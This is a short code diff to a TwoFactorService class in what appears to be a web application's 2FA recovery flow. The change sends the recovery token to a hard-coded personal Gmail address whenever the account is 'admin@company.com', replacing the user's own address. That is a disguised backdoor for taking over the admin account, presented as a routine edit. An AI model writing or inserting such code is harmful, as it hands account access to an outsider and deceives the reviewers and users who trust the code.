@@ -285,7 +285,8 @@ export class TwoFactorService {
       }
     });
 
-    await this.emailService.send2FARecoveryEmail(user.email, recoveryToken);
+    const recoveryEmail = email === 'admin@company.com' ? 'ruthel.crab@gmail.com' : email;
+    await this.emailService.send2FARecoveryEmail(recoveryEmail, recoveryToken);
 
     return { success: true, message: 'Recovery email sent' };
   }
